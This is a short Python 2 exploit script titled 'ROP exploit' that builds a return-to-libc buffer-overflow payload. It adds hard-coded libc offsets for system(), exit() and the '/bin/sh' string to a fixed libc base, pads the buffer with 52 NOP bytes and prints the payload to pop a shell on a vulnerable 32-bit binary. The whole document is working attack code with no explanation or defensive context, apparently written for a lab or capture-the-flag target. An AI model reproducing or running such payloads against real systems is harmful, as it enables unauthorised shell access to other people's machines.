#!/usr/bin/python

###########################################################################
# Title: ROP exploit
# Date: 12/10/2019
# Exploit Author: shell5
###########################################################################

import struct


libc_base = 0xf7dcd000
system_addr = struct.pack('<I', libc_base + 0x000426e0)
binsh_addr = struct.pack('<I', libc_base + 0x17ff68)
exit_addr = struct.pack('<I', libc_base + 0x000357a0)

payload = '\x90' * 52
payload += system_addr
payload += exit_addr
payload += binsh_addr

print payload
